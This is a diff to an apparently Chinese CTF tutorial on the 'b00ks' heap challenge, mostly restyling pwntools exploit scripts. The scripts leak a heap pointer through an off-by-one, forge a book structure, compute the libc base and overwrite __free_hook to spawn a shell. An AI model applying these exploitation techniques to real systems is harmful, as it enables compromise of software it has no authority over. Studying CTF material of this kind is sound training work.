@@ -250,39 +250,27 @@ signed __int64 __fastcall my_read(_BYTE *ptr, int number)
 为了实现泄漏，首先在 author name 中需要输入 32 个字节来使得结束符被覆盖掉。之后我们创建 book1 ，这个 book1 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。
 
 ```
-def js(str):
-     return io.recvuntil(str)
+io.recvuntil('Enter author name:') # input author name
+io.sendline('a' * 32)
 
-def jsn(num):
-     return io.recvn(num)
+io.recvuntil('>') # create book1
+io.sendline('1')
+io.recvuntil('Enter book name size:')
+io.sendline('32')
+io.recvuntil('Enter book name (Max 32 chars):')
+io.sendline('object1')
+io.recvuntil('Enter book description size:')
+io.sendline('32')
+io.recvuntil('Enter book description:')
+io.sendline('object1')
 
-def fs(str):
-     io.sendline(str)
-
-def fsn(str):
-     io.send(str)
-
-js('Enter author name:') #input author name
-fs('a'*32)
-
-js('>')# create book1
-fs('1')
-js('Enter book name size:')
-fs('32')
-js('Enter book name (Max 32 chars):')
-fs('object1')
-js('Enter book description size:')
-fs('32')
-js('Enter book description:')
-fs('object1')
-
-js('>')# print book1
-fs('4')
-js('Author:')
-js('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
-book1_addr=jsn(6)
-book1_addr=book1_addr.ljust(8,'\x00')
-book1_addr=u64(book1_addr)
+io.recvuntil('>') # print book1
+io.sendline('4')
+io.recvuntil('Author:')
+io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
+book1_addr = io.recv(6)
+book1_addr = book1_addr.ljust(8,'\x00')
+book1_addr = u64(book1_addr)
 ```
 
 
@@ -295,18 +283,18 @@ book1_addr=u64(book1_addr)
 
 ```
 def off_by_one(addr):
-    addr+=58
-    js('>')# create fake book in description
-    fs('3')
-    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff)
-    js('Enter new book description:')
-    fs(fake_book_data)      # <== fake book
+    addr += 58
+    io.recvuntil('>')# create fake book in description
+    io.sendline('3')
+    fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff)
+    io.recvuntil('Enter new book description:')
+    io.sendline(fake_book_data) # <== fake book
 
 
-    js('>')# change author name
-    fs('5')
-    js('Enter author name:')
-    fs('a'*32)          # <== off-by-one
+    io.recvuntil('>') # change author name
+    io.sendline('5')
+    io.recvuntil('Enter author name:')
+    io.sendline('a' * 32) # <== off-by-one
 ```
 
 这里在 description 中伪造了 book ，使用的数据是 p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) 。
@@ -368,12 +356,12 @@ Start              End                Offset             Perm Path
 from pwn import *
 context.log_level="info"
 
-binary=ELF("b00ks")
-libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
-io=process("./b00ks")
+binary = ELF("b00ks")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+io = process("./b00ks")
 
 
-def createbook(name_size,name,des_size,des):
+def createbook(name_size, name, des_size, des):
 	io.readuntil("> ")
 	io.sendline("1")
 	io.readuntil(": ")
@@ -390,14 +378,14 @@ def printbook(id):
 	io.sendline("4")
 	io.readuntil(": ")
 	for i in range(id):
-		book_id=int(io.readline()[:-1])
+		book_id = int(io.readline()[:-1])
 		io.readuntil(": ")
-		book_name=io.readline()[:-1]
+		book_name = io.readline()[:-1]
 		io.readuntil(": ")
-		book_des=io.readline()[:-1]
+		book_des = io.readline()[:-1]
 		io.readuntil(": ")
-		book_author=io.readline()[:-1]
-	return book_id,book_name,book_des,book_author
+		book_author = io.readline()[:-1]
+	return book_id, book_name, book_des, book_author
 
 def createname(name):
 	io.readuntil("name: ")
@@ -409,7 +397,7 @@ def changename(name):
 	io.readuntil(": ")
 	io.sendline(name)
 
-def editbook(book_id,new_des):
+def editbook(book_id, new_des):
 	io.readuntil("> ")
 	io.sendline("3")
 	io.readuntil(": ")
@@ -423,37 +411,35 @@ def deletebook(book_id):
 	io.readuntil(": ")
 	io.sendline(str(book_id))
 
-createname("A"*32)
-createbook(128,"a",32,"a")
-createbook(0x21000,"a",0x21000,"b")
+createname("A" * 32)
+createbook(128, "a", 32, "a")
+createbook(0x21000, "a", 0x21000, "b")
 
 
-book_id_1,book_name,book_des,book_author=printbook(1)
-book1_addr=u64(book_author[32:32+6].ljust(8,'\x00'))
-log.success("book1_address:"+hex(book1_addr))
+book_id_1, book_name, book_des, book_author = printbook(1)
+book1_addr = u64(book_author[32:32+6].ljust(8,'\x00'))
+log.success("book1_address:" + hex(book1_addr))
 
-payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
-editbook(book_id_1,payload)
-changename("A"*32)
-book_id_1,book_name,book_des,book_author=printbook(1)
-book2_name_addr=u64(book_name.ljust(8,"\x00"))
-book2_des_addr=u64(book_des.ljust(8,"\x00"))
-log.success("book2 name addr:"+hex(book2_name_addr))
-log.success("book2 des addr:"+hex(book2_des_addr))
-libc_base=book2_des_addr-0x5b9010
-log.success("libc base:"+hex(libc_base))
+payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
+editbook(book_id_1, payload)
+changename("A" * 32)
 
-free_hook=libc_base+libc.symbols["__free_hook"]
-one_gadget=libc_base+0x4f322 #0x4f2c5 0x10a38c 0x4f322
-log.success("free_hook:"+hex(free_hook))
-log.success("one_gadget:"+hex(one_gadget))
-editbook(1,p64(free_hook)*2)
-editbook(2,p64(one_gadget))
-#gdb.attach(io)
+book_id_1, book_name, book_des, book_author = printbook(1)
+book2_name_addr = u64(book_name.ljust(8,"\x00"))
+book2_des_addr = u64(book_des.ljust(8,"\x00"))
+log.success("book2 name addr:" + hex(book2_name_addr))
+log.success("book2 des addr:" + hex(book2_des_addr))
+libc_base = book2_des_addr - 0x5b9010
+log.success("libc base:" + hex(libc_base))
 
+free_hook = libc_base + libc.symbols["__free_hook"]
+one_gadget = libc_base + 0x4f322 # 0x4f2c5 0x10a38c 0x4f322
+log.success("free_hook:" + hex(free_hook))
+log.success("one_gadget:" + hex(one_gadget))
+editbook(1, p64(free_hook) * 2)
+editbook(2, p64(one_gadget))
 
 deletebook(2)
-
 
 io.interactive()
 ```
@@ -470,27 +456,12 @@ exp 如下：
 #! /usr/bin/env python2
 # -*- coding: utf-8 -*-
 # vim:fenc=utf-8
-#
-# Copyright © 2018 anciety <anciety@anciety-pc>
-#
-# Distributed under terms of the MIT license.
+
 import sys
 import os
 import os.path
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
-context.terminal = ['lxterminal', '-e']
-
-# synonyms for faster typing
-tube.s = tube.send
-tube.sl = tube.sendline
-tube.sa = tube.sendafter
-tube.sla = tube.sendlineafter
-tube.r = tube.recv
-tube.ru = tube.recvuntil
-tube.rl = tube.recvline
-tube.rr = tube.recvregex
-tube.irt = tube.interactive
 
 if len(sys.argv) > 2:
     DEBUG = 0
@@ -505,54 +476,47 @@ else:
 
     p = process(PATH)
 
-orig_attach = gdb.attach
-def gdb_attach(*args, **kwargs):
-    if DEBUG:
-        orig_attach(*args, **kwargs)
-gdb.attach = gdb_attach
-
-
 def cmd(choice):
-    p.ru('> ')
-    p.sl(str(choice))
+    p.recvuntil('> ')
+    p.sendline(str(choice))
 
 
 def create(book_size, book_name, desc_size, desc):
     cmd(1)
-    p.ru(': ')
-    p.sl(str(book_size))
-    p.ru(': ')
+    p.recvuntil(': ')
+    p.sendline(str(book_size))
+    p.recvuntil(': ')
     if len(book_name) == book_size:
-        p.s(book_name)
+        p.send(book_name)
     else:
-        p.sl(book_name)
-    p.ru(': ')
-    p.sl(str(desc_size))
-    p.ru(': ')
+        p.sendline(book_name)
+    p.recvuntil(': ')
+    p.sendline(str(desc_size))
+    p.recvuntil(': ')
     if len(desc) == desc_size:
-        p.s(desc)
+        p.send(desc)
     else:
-        p.sl(desc)
+        p.sendline(desc)
 
 
 def remove(idx):
     cmd(2)
-    p.ru(': ')
-    p.sl(str(idx))
+    p.recvuntil(': ')
+    p.sendline(str(idx))
 
 
 def edit(idx, desc):
     cmd(3)
-    p.ru(': ')
-    p.sl(str(idx))
-    p.ru(': ')
-    p.s(desc)
+    p.recvuntil(': ')
+    p.sendline(str(idx))
+    p.recvuntil(': ')
+    p.send(desc)
 
 
 def author_name(author):
     cmd(5)
-    p.ru(': ')
-    p.s(author)
+    p.recvuntil(': ')
+    p.send(author)
 
 
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
@@ -561,14 +525,14 @@ def main():
     # Your exploit script goes here
 
     # leak heap address
-    p.ru('name: ')
-    p.sl('x' * (0x20 - 5) + 'leak:')
+    p.recvuntil('name: ')
+    p.sendline('x' * (0x20 - 5) + 'leak:')
 
     create(0x20, 'tmp a', 0x20, 'b') # 1
     cmd(4)
-    p.ru('Author: ')
-    p.ru('leak:')
-    heap_leak = u64(p.rl().strip().ljust(8, '\x00'))
+    p.recvuntil('Author: ')
+    p.recvuntil('leak:')
+    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))
     p.info('heap leak @ 0x%x' % heap_leak)
     heap_base = heap_leak - 0x1080
 
@@ -584,7 +548,6 @@ def main():
     create(0x20, '/bin/sh\x00', 0x200, 'to arbitrary read write') # 6
 
     edit(4, payload) # overflow
-    gdb.attach(p)
     remove(5) # unlink
 
     edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\n')
@@ -596,10 +559,10 @@ def main():
     def read_at(addr):
         edit(4, p64(addr) + '\n')
         cmd(4)
-        p.ru('Description: ')
-        p.ru('Description: ')
-        p.ru('Description: ')
-        content = p.rl()[:-1]
+        p.recvuntil('Description: ')
+        p.recvuntil('Description: ')
+        p.recvuntil('Description: ')
+        content = p.recvline()[:-1]
         p.info(content)
         return content
 
@@ -609,7 +572,7 @@ def main():
     write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10)
     remove(6)
 
-    p.irt()
+    p.interactive()
 
 if __name__ == '__main__':
     main()
